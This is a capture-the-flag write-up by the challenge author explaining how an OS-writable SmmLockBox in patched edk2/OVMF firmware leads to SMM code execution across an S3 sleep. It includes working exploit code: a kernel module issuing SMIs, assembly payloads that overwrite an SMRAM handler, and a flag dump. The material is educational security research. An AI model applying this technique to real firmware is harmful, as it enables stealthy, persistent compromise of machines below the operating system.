# SMM Is Asleep

by YiFei Zhu

> The engineers at SIGPwny Inc. is up to some shenanigans again in SMM. They
> totally thought it was safe to expose the write API of SmmLockBox to the OS.
> Unfortunately the secrets (flag) at physical address 0x44440000 got leaked
> again, and it's only readable from SMM! How was this possible?
>
> `$ socat file:$(tty),raw,echo=0 openssl:smm-is-asleep.chal.uiuc.tf:1337`
>
> Hint: According to the logs, the attacker put the system to S3 sleep for a
> brief period of time.

## Background

The inspiration of this challenge came from when I was making UIUCTF 2022's
[SMM Cowsay](https://github.com/sigpwny/UIUCTF-2022-Public/tree/main/systems)
(I never wrote a writeup for this, but check out
[Marco Bonelli's writeup](https://web.archive.org/web/20250418033517/https://towerofhanoi.it/writeups/2022-08-15-uiuctf-2022-smm-cowsay/)).

At the time, OVMF with SMM required this flag to run:
`-global ICH9-LPC.disable_s3=1`. It is obvious from the arguments, that it
disabled S3, but I never actually investigated. Without the flag, OVMF debug
logs would contain this and the boot would stop:

```
S3Verification: S3Resume2Pei doesn't support X64 PEI + SMM yet.
S3Verification: Please disable S3 on the QEMU command line (see the README),
S3Verification: or build OVMF with "OvmfPkgIa32X64.dsc".
```

When I was asked to create a UEFI chal for UIUCTF 2025, I didn't want to make
another SMM ROP chal, and I thought: hmm, if S3 support was disabled, there
surely has to be some security-related reason, right? Turns out, this
assumption was wrong. As I started making this chal, compiling OVMF and making
a VM with both SMM + S3, QEMU no longer rejected my boot attempt, and I was
pleasantly surprised.

Turns out, EDKII [commit 098c55702318 ("OvmfPkg/PlatformPei: drop
S3Verification()")](https://github.com/tianocore/edk2/commit/098c55702318fd907de6fad7b43b5e9a6ad9ff7f)
removed this restriction of S3 ^ SMM.

Then I began searching: what is the minimum amount of change, that would make
SMM exploitable with an S3 sleep? S3 sleep highly relies on a "Lockbox" API,
so that the firmware can save information so that it can skip the DXE phase
when it resumes from S3. Every doc I see talk about how Lockbox saves boot
scripts and stuffs... what if I let people mutate it?

Turns out, that's all that's needed.

## Challenge

```bash
$ socat file:$(tty),raw,echo=0 openssl:smm-is-asleep.chal.uiuc.tf:1337
== proof-of-work: disabled ==
+ mount -n -t proc -o nosuid,noexec,nodev proc /proc/
+ mount -n -o remount,rw /
+ mkdir -p /dev /sys /etc
+ mount -n -t sysfs -o nosuid,noexec,nodev sys /sys
+ mount -n -t tmpfs -o mode=1777 tmpfs /tmp
+ cd /root
+ exec setsid bash -l
uiuctf-2025:/root#
```

The challenge is run with a root shell given, which has ability to compile and
load kernel modules in a VM running in QEMU.

The main interest in the handout comes in the patches to edk2 and qemu:
- `qemu/0001-Implement-UIUCTFMMIO-device.patch` - Basically UIUCTF
2022's patch. MMIO device at 0x44440000 that gives the real flag only when read
in SMM
- `edk2/0001-PiSmmCpuDxeSmm-Protect-flag-addresses.patch` - Also same as
UIUCTF 2022's patch. To require arbitrary code execution to solve the chal.
- `qemu/0002-Enable-system-wakeup-via-serial-input.patch` - Normally, once a
QEMU VM goes to S3 sleep, you need a monitor command to wake it up. You also
would get no indication that it did go to sleep. While the former can be fixed
with a QEMU command line argument, for the latter I wanted to add a printf, and
since a patch is needed anyways, I might as well do both in a patch.
- `edk2/0002-SmmLockBox-Don-t-lock-at-end-of-DXE.patch` - Now, this is
interesting:

   ```diff
   diff --git a/MdeModulePkg/Universal/LockBox/SmmLockBox/SmmLockBox.c b/MdeModulePkg/   Universal/LockBox/SmmLockBox/SmmLockBox.c
   index c1e15c596b..ec92b44fe1 100644
   --- a/MdeModulePkg/Universal/LockBox/SmmLockBox/SmmLockBox.c
   +++ b/MdeModulePkg/Universal/LockBox/SmmLockBox/SmmLockBox.c
   @@ -383,7 +383,6 @@ SmmReadyToLockEventNotify (
      IN EFI_HANDLE      Handle
      )
    {
   -  mLocked = TRUE;
      return EFI_SUCCESS;
    }
   ```

As said in the background, I wanted lockboxes to be mutable by the OS at
runtime, and the above patch accomplishes exactly that. In `SmmLockBox.c`,
these functions are gated by `mLocked`:
```C
VOID
SmmLockBoxSave (
  IN EFI_SMM_LOCK_BOX_PARAMETER_SAVE  *LockBoxParameterSave
  )

VOID
SmmLockBoxSetAttributes (
  IN EFI_SMM_LOCK_BOX_PARAMETER_SET_ATTRIBUTES  *LockBoxParameterSetAttributes
  )

VOID
SmmLockBoxUpdate (
  IN EFI_SMM_LOCK_BOX_PARAMETER_UPDATE  *LockBoxParameterUpdate
  )
```

They normally return `EFI_ACCESS_DENIED` after `SmmReadyToLock`, which is
basically the same as `EndOfDxe`, when the firmware begins to load untrusted
code.

These functions all do, from what I could tell, sufficient bounds checking via
`SmmIsBufferOutsideSmmValid`. I will assume that the Lockbox API itself is
hardened enough, and it's not some SMM heap issue.

## Vulnerability

This whitepaper from RedHat has a good introduction on the security of OVMF:
[Open Virtual Machine Firmware (OVMF) Status Report, July 2014](https://www.linux-kvm.org/downloads/lersek/ovmf-whitepaper-c770f8c.txt).
It is however very outdated, but still contains a lot of useful information
on how different things are accessed on different code paths, and how they are
protected from accidental or malicious modifications.

However, when I was solving this challenge myself, my idea was to look at who
uses lockbox, and how it is being used. Everyone talks about boot scripts, and
`S3Resume2Pei` is very interesting:

```C
EFI_STATUS
EFIAPI
S3RestoreConfig2 (
  IN EFI_PEI_S3_RESUME2_PPI  *This
  )
{
[...]
  Status = RestoreAllLockBoxInPlace ();
[...]
  S3ResumeExecuteBootScript (AcpiS3Context, EfiBootScriptExecutorVariable);
  return EFI_SUCCESS;
}

[...]

VOID
EFIAPI
S3ResumeExecuteBootScript (
  IN ACPI_S3_CONTEXT                *AcpiS3Context,
  IN BOOT_SCRIPT_EXECUTOR_VARIABLE  *EfiBootScriptExecutorVariable
  )
{
[...]
      DEBUG ((DEBUG_INFO, "Close all SMRAM regions before executing boot script\n"));

      for (Index = 0, Status = EFI_SUCCESS; !EFI_ERROR (Status); Index++) {
        Status = SmmAccess->Close ((EFI_PEI_SERVICES **)GetPeiServicesTablePointer (), SmmAccess, Index);
      }

      DEBUG ((DEBUG_INFO, "Lock all SMRAM regions before executing boot script\n"));

      for (Index = 0, Status = EFI_SUCCESS; !EFI_ERROR (Status); Index++) {
        Status = SmmAccess->Lock ((EFI_PEI_SERVICES **)GetPeiServicesTablePointer (), SmmAccess, Index);
      }
```

Wait a second, when S3Resume2Pei is executed, SMRAM regions are open! So S3
resets the SMRAM open and lock bits!

This is further confirmed by edk2 debug logs:

```
SmmLockBoxPeiLib RestoreAllLockBoxInPlace - Enter
SmmLockBoxPeiLib LocatePpi - (Not Found)
SmmLockBoxPeiLib RestoreAllLockBoxInPlace - Exit (Success)
```

```C
RETURN_STATUS
EFIAPI
RestoreAllLockBoxInPlace (
  VOID
  )
{
[...]
  DEBUG ((DEBUG_INFO, "SmmLockBoxPeiLib RestoreAllLockBoxInPlace - Enter\n"));

  Status = PeiServicesLocatePpi (
             &gEfiPeiSmmCommunicationPpiGuid,
             0,
             NULL,
             (VOID **)&SmmCommunicationPpi
             );
  if (EFI_ERROR (Status)) {
    DEBUG ((DEBUG_INFO, "SmmLockBoxPeiLib LocatePpi - (%r)\n", Status));
    Status = InternalRestoreAllLockBoxInPlaceFromSmram ();
    DEBUG ((DEBUG_INFO, "SmmLockBoxPeiLib RestoreAllLockBoxInPlace - Exit   (%r)\n", Status));
    return Status;
  }
```

And `InternalRestoreAllLockBoxInPlaceFromSmram` straight up simply reads the
lockbox-saved data from SMRAM...

However, the boot script, which in theory we could get an arbitrary code
execution from, executes after SMRAM close + lock, so that would be a giant red
herring, ~~and would probably trap any LLM solvers~~. We need something else to
allow us to copy some payload into SMRAM... before SMRAM close.

Wait a second, `RestoreAllLockBoxInPlace`... restores in place. S3Resume2Pei
code lives outside SMRAM right (since it's PEI code not SMM code)? So that
would get past `SmmIsBufferOutsideSmmValid` checks. And PEI should be entirely
RWX, so what would stop us from overwriting S3Resume2Pei code through
`RestoreAllLockBoxInPlace`, and, with this code, we could just overwrite SMRAM
with our payload, while SMRAM is open? Nothing will stop us!

### Tangent: S3Resume2Pei addresses & integrity

One might think they could just overwrite S3Resume2Pei from the OS without
using a lockbox, since PEI code is extracted already during normal boot.
However, S3Resume2Pei is extracted to different locations:

```
Loading PEIM at 0x0000EF5C000 EntryPoint=0x0000EF5ED55 S3Resume2Pei.efi
Loading PEIM at 0x00000852540 EntryPoint=0x00000855295 S3Resume2Pei.efi
```

The difference in the addresses is due to PEIM shadowing on normal boot.
`MdeModulePkg.dec` defines the defaults:
```
## Indicates if to shadow PEIM on S3 boot path after memory is ready.<BR><BR>
#   TRUE  - Shadow PEIM on S3 boot path after memory is ready.<BR>
#   FALSE - Not shadow PEIM on S3 boot path after memory is ready.<BR>
# @Prompt Shadow Peim On S3 Boot.
gEfiMdeModulePkgTokenSpaceGuid.PcdShadowPeimOnS3Boot|FALSE|BOOLEAN|0x30001028

## Indicates if to shadow PEIM and PeiCore after memory is ready.<BR><BR>
#  This PCD is used on other boot path except for S3 boot.
#   TRUE  - Shadow PEIM and PeiCore after memory is ready.<BR>
#   FALSE - Not shadow PEIM after memory is ready.<BR>
# @Prompt Shadow Peim and PeiCore on boot
gEfiMdeModulePkgTokenSpaceGuid.PcdShadowPeimOnBoot|TRUE|BOOLEAN|0x30001029
```

0xEF5C000 is part of "permanent memory", and 0x852540 is part of "temporary"
memory. However since QEMU does not implement caches, they are functionally
the same.

The PEI image loader decides where to load images based on this PCD:
```C
EFI_STATUS
LoadAndRelocatePeCoffImage (
  IN  EFI_PEI_FILE_HANDLE   FileHandle,
  IN  VOID                  *Pe32Data,
  OUT EFI_PHYSICAL_ADDRESS  *ImageAddress,
  OUT UINT64                *ImageSize,
  OUT EFI_PHYSICAL_ADDRESS  *EntryPoint
  )
{
[...]
  if ((!ImageContext.RelocationsStripped) && (Private->PeiMemoryInstalled) &&
      ((!IsPeiModule) || PcdGetBool (PcdMigrateTemporaryRamFirmwareVolumes) ||
       (!IsS3Boot && (PcdGetBool (PcdShadowPeimOnBoot) || IsRegisterForShadow)) ||
       (IsS3Boot && PcdGetBool (PcdShadowPeimOnS3Boot)))
      )
  {
[...]
      Status = PeiServicesAllocatePages (
                 EfiBootServicesCode,
                 EFI_SIZE_TO_PAGES ((UINT32)AlignImageSize),
                 &ImageContext.ImageAddress
                 );
[...]
    } else {
[...]
        ImageContext.ImageAddress = (EFI_PHYSICAL_ADDRESS)(UINTN)Pe32Data;
[...]
      }
    }
```

And as for the source of this PE image? Nah no there's not much we can do
about it. OVMF's SecMain forces a FV decompression from flash if S3 && SMM:

```C
VOID
FindPeiCoreImageBase (
  IN OUT  EFI_FIRMWARE_VOLUME_HEADER  **BootFv,
  OUT  EFI_PHYSICAL_ADDRESS           *PeiCoreImageBase
  )
{
  BOOLEAN  S3Resume;

  *PeiCoreImageBase = 0;

  S3Resume = IsS3Resume ();
  if (S3Resume && !FeaturePcdGet (PcdSmmSmramRequire)) {
    //
    // A malicious runtime OS may have injected something into our previously
    // decoded PEI FV, but we don't care about that unless SMM/SMRAM is required.
    //
    DEBUG ((DEBUG_VERBOSE, "SEC: S3 resume\n"));
    GetS3ResumePeiFv (BootFv);
  } else {
    //
    // We're either not resuming, or resuming "securely" -- we'll decompress
    // both PEI FV and DXE FV from pristine flash.
    //
    DEBUG ((
      DEBUG_VERBOSE,
      "SEC: %a\n",
      S3Resume ? "S3 resume (with PEI decompression)" : "Normal boot"
      ));
    FindMainFv (BootFv);

    DecompressMemFvs (BootFv);
  }

  FindPeiCoreImageBaseInFv (*BootFv, PeiCoreImageBase);
}
```

And SEC? It runs directly from flash...

Therefore, without an arbitrary flash write, there's an intact root of trust
originating from flash that keeps PEIMs such as S3Resume2Pei intact on S3.

## Exploit

The exploit is delivered via 4 stages:

### Stage 1: Installing the PEI payload into a lockbox:

This can be done via SMM communication via SMI from the OS using a kernel
module:

```C
static unsigned long RtDataPhys = 0x000000000E8ED000;
static struct RtDataLayout *RtDataVirt;
static unsigned long PiSmmIplPhys = 0x0000EAC6000;
static void *PiSmmIplVirt;
static unsigned long S3Resume2PeiPhys = 0x00000852540;
static void *S3Resume2PeiVirt;

static unsigned long mSmmCorePrivateDataOffset = 0x7160;
static ptrdiff_t S3Resume2Pei_payload_off = 0x00000000000028b8;

noinline __noclone
static void smi(void)
{
	__asm__ __volatile__(
		"xor %%eax,%%eax\n"
		"outb %%al,$0xB3\n"
		"outb %%al,$0xB2\n"
		"jmp 1f\n"
		"1:\n"
		::: "rax","memory"
	);
}

static int __init lockbox(union lockboxparam *data)
{
	SMM_CORE_PRIVATE_DATA *gSmmCorePrivate =
		PiSmmIplVirt + mSmmCorePrivateDataOffset;

	RtDataVirt->header.HeaderGuid = (EFI_GUID)
		{ 0x2a3cfebd, 0x27e8, 0x4d0a, { 0x8b, 0x79, 0xd6, 0x88, 0xc2, 0xa3, 0xe1, 0xc0 }};
	RtDataVirt->header.MessageLength = sizeof(struct RtDataLayout);
	RtDataVirt->lockboxparam = *data;

	gSmmCorePrivate->CommunicationBuffer = (void *)RtDataPhys;
	gSmmCorePrivate->BufferSize = sizeof(EFI_SMM_COMMUNICATE_HEADER) +
		RtDataVirt->header.MessageLength;

	mb();
	smi();

	return 0;
}


static int __init exploit_init(void)
{
	RtDataVirt = ioremap(RtDataPhys, 0x1000);
	PiSmmIplVirt = ioremap(PiSmmIplPhys, 0x10000);
	S3Resume2PeiVirt = ioremap(S3Resume2PeiPhys, 0x10000);

	memcpy(S3Resume2PeiVirt + S3Resume2Pei_payload_off, &payload_stage2,
		&payload_end-&payload_stage2);

	lockbox(&(union lockboxparam){ .save = {
		.Header.Command      = EFI_SMM_LOCK_BOX_COMMAND_SAVE,
		.Header.DataLength   = sizeof (EFI_SMM_LOCK_BOX_PARAMETER_SAVE),
		.Header.ReturnStatus = (UINT64)-1,
		.Guid                = (EFI_GUID)
			{ 0xda1a9002, 0x041b, 0x44b4, { 0xa9, 0x17, 0xfc, 0xe3, 0x89, 0xfd, 0x0a, 0xa1 }},
		.Buffer              = S3Resume2PeiPhys + S3Resume2Pei_payload_off,
		.Length              = &payload_end-&payload_stage2,
	}});

	lockbox(&(union lockboxparam){ .setattr = {
		.Header.Command      = EFI_SMM_LOCK_BOX_COMMAND_SET_ATTRIBUTES,
		.Header.DataLength   = sizeof (EFI_SMM_LOCK_BOX_PARAMETER_SET_ATTRIBUTES),
		.Header.ReturnStatus = (UINT64)-1,
		.Guid                = (EFI_GUID)
			{ 0xda1a9002, 0x041b, 0x44b4, { 0xa9, 0x17, 0xfc, 0xe3, 0x89, 0xfd, 0x0a, 0xa1 }},
		.Attributes          = LOCK_BOX_ATTRIBUTE_RESTORE_IN_PLACE,
	}});
```

0x28b8 in S3Resume2Pei is in `S3RestoreConfig2` -> inline
`RestoreAllLockBoxInPlace`, right after the
`InternalRestoreAllLockBoxInPlaceFromSmram` call and `SmmLockBoxPeiLib
RestoreAllLockBoxInPlace - Exit (%r)` print, when the inline function is
returning:

```C
edk2/MdeModulePkg/Library/SmmLockBoxLib/SmmLockBoxPeiLib.c:
695	    Status = InternalRestoreAllLockBoxInPlaceFromSmram ();
   0x000000000000289a <+747>:	call   0x1d69 <InternalRestoreAllLockBoxInPlaceFromSmram>

696	    DEBUG ((DEBUG_INFO, "SmmLockBoxPeiLib RestoreAllLockBoxInPlace - Exit (%r)\n", Status));
   0x000000000000289f <+752>:	mov    rdx,r15
   0x00000000000028a2 <+755>:	xor    r8d,r8d
   0x00000000000028a5 <+758>:	mov    ecx,0x40
   0x00000000000028aa <+763>:	call   0x1749 <DebugPrint>

edk2/UefiCpuPkg/Universal/Acpi/S3Resume2Pei/S3Resume.c:
1079	  Status = RestoreAllLockBoxInPlace ();
   0x00000000000028af <+768>:	xor    edx,edx
   0x00000000000028b1 <+770>:	mov    QWORD PTR [rbp-0x2e0],rdx

1080	  ASSERT_EFI_ERROR (Status);
   0x00000000000028b8 <+777>:	jmp    0x29e0 <S3RestoreConfig2+1073>
```

The GUID `da1a9002-041b-44b4-a917fce389fd0aa1` is just a random UUID I
generated to identify the lockbox.

This stage installs the stage 2 payload to the target location (where
S3Resume2Pei will be), then asks SmmLockBox to save it.

The address of `RtDataPhys` is the start of UEFI runtime data region.
`PiSmmIplPhys` and `S3Resume2PeiPhys` are obtained from `edk2debug.log`:

```
Loading driver at 0x0000EAC6000 EntryPoint=0x0000EAC9EDF PiSmmIpl.efi
Loading PEIM at 0x00000852540 EntryPoint=0x00000855295 S3Resume2Pei.efi
```

### Stage 2: PEI payload installs SMM payload into SMRAM

```asm
payload_stage2:
  pushf
  push %rdi
  push %rsi
  push %rcx
  lea payload_stage3(%rip),%rsi
  mov $(0x0000FFDA000+0x0000000000002743),%rdi // SmmLockBoxPhys + SmmLockBoxHandler
  mov $(payload_end-payload_stage3),%rcx
  rep movsb
  pop %rcx
  pop %rsi
  pop %rdi
  popf
  push $(0x00000852540+0x00000000000029e0) // S3Resume2PeiPhys + jump target
  ret
```

During S3 Resume, `InternalRestoreAllLockBoxInPlaceFromSmram` copies the
stage 2 payload to the code right after the call, and the payload executes as
soon as `InternalRestoreAllLockBoxInPlaceFromSmram` returns. SMRAM is open,
so I overwrite the SMI handler for `SmmLockBoxHandler` since I already have
code to invoke SmmLockbox.

### Stage 3: SMM payload disables paging and switch to protected mode

```asm
payload_stage3:
  push $0x8
  lea protectedmode(%rip),%rax
  push %rax
  retfq
protectedmode: .code32
  mov $(0x80010033 - 0x80000000),%eax
  mov %eax,%cr0
```

Because I'm too lazy to find the correct page table address for 0x44440000, I
prefer to just disable paging. However, one can't disable paging in 64-bit
long mode. Attempting to do so in QEMU TCG would cause it to switch to 16-bit
real mode. I'd rather not deal with segmentation and 16-bit assembly, so I
just switch to 32-bit protected mode (using an existing segment descriptor set
up by EDKII) before turning off paging.

### Stage 4: "Protected" mode SMM payload dumps flag

```asm
  mov $0x44440000,%esi
  mov $0x3f8,%dx
print_loop:
  lodsb
  outb %al,(%dx)
  jmp print_loop
```

Just a simple read memory and dump to serial via IO port 0x3f8.

### Epilogue: Setting off the chain of events

```C
pm_suspend(PM_SUSPEND_MEM);

/* Could be any SMI pretty much */
lockbox(&(union lockboxparam){ .restoreall = {
   .Header.Command      = EFI_SMM_LOCK_BOX_COMMAND_RESTORE_ALL_IN_PLACE,
   .Header.DataLength   = sizeof (EFI_SMM_LOCK_BOX_PARAMETER_RESTORE_ALL_IN_PLACE),
   .Header.ReturnStatus = (UINT64)-1,
}});
```

System goes to S3 suspend, then serial input causes S3 resume, during which
stage 2 payload is run, and the SMI handler for the SmmLockbox protocol is
modified.

Then a final SMI to the modified SMI handler to run stage 3 and stage 4,
dumping the flag:

```
uiuctf-2025:/root# insmod solution.ko
VM suspended. Press enter to resume...
uiuctf{this_is_why_we_cant_have_nice_things_17c079f8}
```

The flag is a reference to how, such an innocent feature of allowing OS to
save things in a trusted lockbox, got so abused... how so often, when one
implements a nice feature, it gets abused and has to be removed...
